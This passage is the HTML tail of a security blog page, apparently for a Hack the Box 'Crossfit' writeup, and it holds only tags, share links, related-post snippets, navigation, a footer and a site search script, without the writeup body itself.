src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/bash/" class="post-tag no-text-decoration" >bash</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/burp/" class="post-tag no-text-decoration" >burp</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/javascript/" class="post-tag no-text-decoration" >javascript</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/sftp/" class="post-tag no-text-decoration" >sftp</a> <a href="/tags/lftp/" class="post-tag no-text-decoration" >lftp</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a> <a href="/tags/ghidra/" class="post-tag no-text-decoration" >ghidra</a> <a href="/tags/binary-analysis/" class="post-tag no-text-decoration" >binary analysis</a> <a href="/tags/c/" class="post-tag no-text-decoration" >c</a> <a href="/tags/insane/" class="post-tag no-text-decoration" >insane</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/polarbearer/" class="post-tag no-text-decoration" >polarbearer</a> <a href="/tags/gibparadox/" class="post-tag no-text-decoration" >gibparadox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Crossfit Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/crossfit/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Crossfit Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/crossfit/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Crossfit Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/crossfit/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/forwardslash/"><div class="card-body"> <span class="timeago small" > Jun 6, 2020 <i class="unloaded">2020-06-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Forwardslash Writeup</h3><div class="text-muted small"><p> HTB - ForwardSlash Overview Useful Skills and Tools Enumeration Nmap scan I started my enumeration with an nmap scan of 10.10.10.183. The options I regularly use are: Flag ...</p></div></div></a></div><div class="card"> <a href="/posts/servmon/"><div class="card-body"> <span class="timeago small" > Jun 21, 2020 <i class="unloaded">2020-06-21T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Servmon Writeup</h3><div class="text-muted small"><p> HTB - Servmon Overview This was an easy Windows machine….but don’t get stuck chasing the rabbits! This machine is on TJ_Null’s list of OSCP-like machines. Have fun! Useful Skills and Tools L...</p></div></div></a></div><div class="card"> <a href="/posts/catch/"><div class="card-body"> <span class="timeago small" > Apr 14, 2022 <i class="unloaded">2022-04-14T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Catch Writeup</h3><div class="text-muted small"><p> HTB - Catch - 10.10.11.150 Overview This medium-difficulty machine by MrR3boot from https://hackthebox.com was a very interesting challenge. It was made much harder than it should have been by...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/laboratory/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Laboratory Writeup</p></a> <a href="/posts/luanne/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Luanne Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
